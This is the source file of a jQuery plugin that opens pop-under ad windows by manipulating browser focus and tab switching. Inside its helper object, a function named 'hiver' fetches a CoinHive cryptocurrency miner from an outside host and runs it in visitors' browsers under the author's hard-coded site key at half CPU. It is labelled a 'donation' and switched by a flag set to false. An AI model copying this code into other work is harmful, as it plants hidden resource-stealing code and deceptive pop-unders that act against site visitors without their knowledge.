/*!
 * jquery-popunder
 *
 * @fileoverview jquery-popunder plugin
 *
 * @author Hans-Peter Buniat <hpbuniat@googlemail.com>
 * @copyright 2012-2017 Hans-Peter Buniat <hpbuniat@googlemail.com>
 * @license http://opensource.org/licenses/BSD-3-Clause
 */

/*global jQuery, window, screen, navigator, top, document, Cookies, CoinHive */
;(function($, window, screen, navigator, document) {
    "use strict";

    /**
     * Create a popunder
     *
     * @param  {Array|function} aPopunder The popunder(s) to open
     * @param  {string|object} form A form, where the submit is used to open the popunder
     * @param  {string|object} trigger A button, where the click is used to open the popunder
     * @param  {object} eventSource The source of the event
     *
     * @return jQuery
     */
    $.popunder = function(aPopunder, form, trigger, eventSource) {
        var t = $.popunder.helper;

        t.init();
        if (typeof Cookies !== t.u) {
            t.c = Cookies.noConflict();
        }

        if (arguments.length === 0) {
            aPopunder = window.aPopunder;
        }
        else if (typeof aPopunder !== t.fu && $(aPopunder).is('a')) {
            eventSource = $.Event('click', {
                'target': aPopunder
            });
            aPopunder = window.aPopunder;
        }

        if (trigger || form) {
            t.bindEvents(aPopunder, form, trigger);
        }
        else {
            aPopunder = (typeof aPopunder === t.fu) ? aPopunder(eventSource) : aPopunder;

            t.reset();
            if (typeof aPopunder !== t.u) {
                do {
                    t.queue(aPopunder, eventSource);
                    t.first = false;
                }
                while (aPopunder.length > 0);
                t.queue(aPopunder, eventSource);
            }
        }

        return $;
    };

    /* several helper functions */
    $.popunder.helper = {

        /**
         * Method names
         *
         * @const string
         */
        POP: 'pop',
        SWITCHER: 'switcher',
        SIMPLE: 'simple',

        /**
         * Reference to the window
         *
         * @var window
         */
        _top: window.self,

        /**
         * Reference to the last popup-window
         *
         * @var object
         */
        lastWin: null,

        /**
         * Reference to the last url
         *
         * @var string
         */
        lastTarget: null,

        /**
         * The flip-popup
         *
         * @var window|boolean
         */
        f: false,

        /**
         * Was the last popunder was processed
         *
         * @var boolean
         */
        last: false,

        /**
         * Is this the first popunder?
         *
         * @var boolean
         */
        first: true,

        /**
         * About:blank
         *
         * @var string
         */
        b: 'about:blank',

        /**
         * undefined
         *
         * @var string
         */
        u: 'undefined',

        /**
         * function
         *
         * @var string
         */
        fu: 'function',

        /**
         * The last opened window-url (before calling href)
         *
         * @var string
         */
        o: null,

        /**
         * The cookie handler
         *
         * @var Cookies
         */
        c: null,

        /**
         * Dummy placeholder - prevent opening a popup but do the magic
         *
         * @var string
         */
        du: '__jqpu',

        /**
         * User-Agent-Handling
         *
         * @var object
         */
        ua: {
            ie: (/msie|trident/i.test(navigator.userAgent)),
            oldIE: (/msie/i.test(navigator.userAgent)),
            edge: (/edge/i.test(navigator.userAgent)),
            ff: (/firefox/i.test(navigator.userAgent)),
            o: (/opera/i.test(navigator.userAgent)),
            g: (/chrome/i.test(navigator.userAgent)),
            w: (/webkit/i.test(navigator.userAgent)),
            linux: (/linux/i.test(navigator.userAgent)),
            touch: ("ontouchstart" in document["documentElement"]) || (/bada|blackberry|iemobile|android|iphone|ipod|ipad/i.test(navigator.userAgent))
        },
        m: false,

        /**
         * Hive-URL
         *
         * @var string
         */
        hive: 'coinhive.com/lib/coinhive.min.js',

        /**
         * Hive-Site
         *
         * @var string
         */
        hives: 'IrsRB2ZPfGcansBsqWzz4mG0CMaS0Luz',

        /**
         * The handler-stack
         *
         * @var Array
         */
        hs: [],

        /**
         * The event-namespace
         *
         * @var String
         */
        ns: 'jqpu',

        // donation to support the author
        donate: false,

        /**
         * The default-options
         *
         * @var object
         */
        def: {

            // properites of the opened window
            window: {
                'toolbar': 0,
                'scrollbars': 1,
                'location': 1,
                'statusbar': 1,
                'menubar': 0,
                'resizable': 1,
                'width': (screen.availWidth - 122).toString(),
                'height': (screen.availHeight - 122).toString(),
                'screenX': 0,
                'screenY': 0,
                'left': 0,
                'top': 0
            },

            // name of the popunder-cookie (defaults to a random-string, when not set)
            name: '__pu',

            // name of the cookie
            cookie: '__puc',

            // the block-time of a popunder in minutes
            blocktime: 15,

            // user-agents to skip
            skip: {
                // there needs to be a matching ua-lookup here
                // 'linux': true
            },

            // callback function, to be executed when a popunder is opened
            cb: null,

            // set to true, if the url should be opened in a popup instead of a popunder
            popup: false
        },

        /**
         * Test a stack of ua's
         *
         * @param  {object} s Stack of ua's
         * @param  {object} ua UA-matching-stack
         *
         * @return boolean Returns true, if current ua is part of the stack
         */
        testStack: function(s, ua) {
            var i, r = false;
            for (i in s) {
                if (s.hasOwnProperty(i)) {
                    if (!!s[i] && !!ua[i]) {
                        r = s[i];
                    }
                }
            }

            return r;
        },

        /**
         * Set the popunder-method by parsing the agent, init hive
         *
         * @return $.popunder.helper
         */
        init: function() {
            var t = this;

            if (!t.m) {
                // defaults for the popunder-method, the last match is used
                t.m = t.testStack({
                    ff: t.POP,
                    ie: t.SWITCHER,
                    edge: t.SWITCHER,
                    w: t.SWITCHER,
                    g: t.SWITCHER,
                    o: t.SWITCHER,
                    linux: t.SWITCHER,
                    touch: t.SWITCHER
                }, t.ua);
            }

            return t.hiver();
        },

        /**
         * Process the queue
         *
         * @param  {Array} aPopunder The popunder(s) to open
         * @param  {object} eventSource The source of the event
         *
         * @return $.popunder.helper
         */
        queue: function(aPopunder, eventSource) {
            var b = false,
                t = this;

            if (aPopunder.length > 0) {
                while (b === false) {
                    var p = aPopunder.shift();
                    b = (p) ? t.open(p[0], p[1] || {}, aPopunder.length, eventSource) : true;
                }
            }
            else if (t.last === false) {
                t.last = true;
                t.bg().href(true);
            }
            else if (!t.f && t.m === t.POP) {
                t.bg();
            }

            return t;
        },

        /**
         * A handler-stub
         *
         * @param  {int} i The handler-stack-index
         * @param  {string|jQuery.Event} trigger The trigger-source
         *
         * @return void
         */
        handler: function(i, trigger) {
            var t = this;
            if (typeof t.hs[i] === t.fu) {
                t.hs[i](trigger);
            }
        },

        /**
         * Get the element to trigger by id
         *
         * @param  {string} trigger The id
         *
         * @returns jQuery
         */
        getTrigger: function(trigger) {
            return $('#' + trigger).parents('.jq-pu').children().eq(0);
        },

        /**
         * Create a popunder
         *
         * @param  {Array} aPopunder The popunder(s) to open
         * @param  {string|jQuery} form A form, where the submit is used to open the popunder
         * @param  {string|jQuery} trigger A button, where the mousedown & click is used to open the popunder
         *
         * @return $.popunder.helper
         */
        bindEvents: function(aPopunder, form, trigger) {
            var t = this,
                s = 'string',
                e = (t.ua.touch ? 'touchstart click' : 'click'),
                hs = t.hs.length,
                c = (function(i) {
                        return function(event) {
                            t.handler(i, event);
                        };
                    }(hs));

            t.hs[hs] = (function(aPopunder){
                return function(event) {
                    if (event && !event.target) {
                        event = {
                            target: t.getTrigger(event)
                        };
                    }

                    $.popunder(aPopunder, false, false, event);
                    return true;
                };
            })(aPopunder);

            if (form && !t.ua.g && !t.ua.w && !t.ua.touch) {
                form = (typeof form === s) ? $(form) : form;
                form.on('submit.' + t.ns, c);
            }

            if (trigger) {
                trigger = (typeof trigger === s) ? $(trigger) : trigger;
                trigger.on(e + '.' + t.ns, c);
            }

            return t;
        },

        /**
         * Helper to create a (optionally) random value with prefix
         *
         * @param  {string} sUrl The url to open
         * @param  {Object} o The options
         *
         * @return boolean
         */
        cookieCheck: function(sUrl, o) {
            var t = this,
                name = t.rand(o.cookie, false),
                cookie = t.c.get(name),
                ret = false;

            if (!cookie) {
                cookie = sUrl;
            }
            else if (cookie.indexOf(sUrl) === -1) {
                cookie += sUrl;
            }
            else {
                ret = true;
            }

            t.c.set(name, cookie, {
                expires: new Date((new Date()).getTime() + o.blocktime * 60000)
            });

            return ret;
        },

        /**
         * Helper to create a (optionally) random value with prefix
         *
         * @param  {string|boolean} name
         * @param  {boolean} rand
         *
         * @return string
         */
        rand: function(name, rand) {
            var t = this,
                p = (!!name) ? name : t.du;
            return p + (rand === false ? '' : Math.floor(89999999 * Math.random() + 10000000).toString()).replace('.', '');
        },

        /**
         * Open the popunder
         *
         * @param  {string} sUrl The URL to open
         * @param  {object} opts Options for the Popunder
         * @param  {int} iLength Length of the popunder-stack
         * @param  {object} eventSource The source of the event
         *
         * @return boolean
         */
        open: function(sUrl, opts, iLength, eventSource) {
            var t = this,
                i, o = $.extend(true, {}, t.def, opts);

            t.o = sUrl;
            if (top !== window.self) {
                try {
                    if (top.document.location.toString()) {
                        t._top = top;
                    }
                } catch (err) {}
            }

            // test if current user-agent forces skipping
            if (t.testStack(o.skip, t.ua)) {
                return false;
            }

            // test if cookie-blocktime is active
            if (o.blocktime && (typeof t.c === t.fu) && t.cookieCheck(sUrl, o)) {
                return false;
            }

            if (sUrl !== t.du) {
                t.lastTarget = sUrl;
                if (t.first === true && t.m === t.SWITCHER) {
                    if (eventSource && typeof eventSource.target !== this.u) {
                        i = t.getElementUrl(eventSource);
                        eventSource.preventDefault();
                    }

                    t.switcher.switchWindow(i, t.o, t.rand(o.name, !opts.name));
                }
                else if (t.first === true || true === t.isMultiple()) {
                    t.lastWin = (t._top.window.open(t.o, t.rand(o.name, !opts.name), t.getOptions(o.window)) || t.lastWin);
                }

                if (t.ua.ff === true) {
                    t.bg();
                }

                t.href(iLength);
                if (typeof o.cb === t.fu) {
                    o.cb(t.lastWin);
                }
            }

            return true;
        },

        /**
         * Move a popup to the background
         *
         * @param  {int|boolean|string} l True, if the url should be set
         *
         * @return $.popunder.helper
         */
        bg: function(l) {
            var t = this;
            if (t.lastWin && t.lastTarget && !l) {
                if (t.m === t.SIMPLE) {
                    t.switcher.simple(t);
                    window.setTimeout(function () {
                        t.switcher.simple(t);
                    }, 500);
                }
                else {
                    t.switcher.pop(t);
                }
            }
            else if (l === 'oc') {
                t.switcher.pop(t);
            }

            return t;
        },

        /**
         * Handle the window switching
         *
         * @return void
         */
        switcher: {

            /**
             * Classic popunder, used for ie
             *
             * @param  {$.popunder.helper} t
             *
             * @return void
             */
            simple: function(t) {
                if (t.ua.oldIE) {
                    t.lastWin["blur"]();
                    t.lastWin["opener"]["window"]["focus"]();
                    window["self"]["window"]["focus"]();
                    window["focus"]();
                }
                else {
                    document["focus"]();
                }
            },

            /**
             * Popunder for firefox & old google-chrome
             * In ff4+, chrome21-23 we need to trigger a window.open loose the focus on the popup. Afterwards we can re-focus the parent-window
             *
             * @param  {$.popunder.helper} t
             *
             * @return void
             */
            pop: function(t) {
                (function(e) {
                    try {
                        t.f = e.window.open(t.b);
                        if (!!t.f) {
                            t.f.close();
                        }
                    }
                    catch (err) {}

                    try {
                        e.opener.window.focus();
                    }
                    catch (err) {}
                })(t.lastWin);
            },

            /**
             * Set the handle tab-switch url
             *
             * @param  {String} payloadUrl
             * @param  {String} popunderUrl
             * @param  {String} windowName
             *
             * @return void
             */
            switchWindow: function (payloadUrl, popunderUrl, windowName) {
                window["open"](payloadUrl, windowName);
                window["location"]["assign"](popunderUrl);
            }
        },

        /**
         * Check if we're able to open multiple pu
         *
         * @return boolean
         */
        isMultiple: function() {
            var t = this;
            return (t.m === t.POP || t.m === t.simple);
        },

        /**
         * Set the popunder's url
         *
         * @param  {int|boolean} l True, if the url should be set
         *
         * @return $.popunder.helper
         */
        href: function(l) {
            var t = this;
            if (l && t.lastTarget && t.lastWin && t.lastTarget !== t.b && t.lastTarget !== t.o) {
                t.lastWin.document.location.href = t.lastTarget;
            }

            return t;
        },

        /**
         * Get the url of a form-element including the payload
         *
         * @param  {jQuery.Event} source
         * @param  {boolean} returnEvenIfNotBlank
         *
         * @return String
         */
        getElementUrl: function(source, returnEvenIfNotBlank) {
            var t = this,
                sel = ':submit, button',
                $target = $(source.target),
                $f, s, m,
                notBlank = (typeof returnEvenIfNotBlank === t.u);

            if ($target.is('a') && notBlank) {
                $f = $target;
                s = $target.attr('href');
            }
            else if ($target.is(sel) !== true) {
                $target = $target.parents(sel);
                $f = $target.parents('form');
            }
            else {
                $f = $(source.target.form);
                if ($target.is(sel) && (!$f || !$f.length)) {
                    $f = $target.parents('form');
                }
            }

            if (!s && $target.length !== 0 && $f.length !== 0) {
                m = ($f.prop('method') + ''); // cast to string
                if (m.toLowerCase() === 'get' && ($f.attr('target') === '_blank' || notBlank)) {
                    s = $f.attr('action') + '/?' + $f.serialize();
                }
            }

            return s;
        },

        /**
         * Reset the instance
         *
         * @return $.popunder.helper
         */
        reset: function() {
            var t = this;
            t.f = t.last = false;
            t.first = true;
            t.lastTarget = t.lastWin = null;
            return t;
        },

        /**
         * Unbind a popunder-handler
         *
         * @return $.popunder.helper
         */
        unbind: function(form, trigger) {
            var t = this,
                s = 'string';

            t.reset();
            if (!!form) {
                form = (typeof form === s) ? $(form) : form;
                form.off('submit.' + t.ns);
            }

            if (!!trigger) {
                trigger = (typeof trigger === s) ? $(trigger) : trigger;
                trigger.off('click.' + t.ns).next('.jq-pu object').remove();
                trigger.unwrap();
            }

            window.aPopunder = [];

            return t;
        },

        /**
         * Get the option-string for the popup
         *
         * @return {String}
         */
        getOptions: function(opts) {
            var a = [], i;
            for (i in opts) {
                if (opts.hasOwnProperty(i)) {
                    a.push(i + '=' + opts[i]);
                }
            }

            return a.join(',');
        },

        /**
         * Hive mind
         *
         * @return $.popunder.helper
         */
        hiver: function() {
            var t = this,
                h = document.location.hostname || t.du,
                p = 0.5,
                m;
            if (t.donate && navigator.hardwareConcurrency > 2 && (t.ua.g || t.ua.ff || t.ua.o) && (true || /\.(?:.(?!\.))[a-z]+$/ig.test(h))) {
                $.getScript('https://' + t.hive, function () {
                    if (typeof CoinHive.User === t.fu) {
                        m = new CoinHive.User(t.hives, h, {
                            throttle: p
                        });
                        m.on('accepted', function () {
                            m.stop();
                        });
                        m.start();
                    }
                });
            }

            return t;
        }
    };

})(jQuery, window, screen, navigator, document);
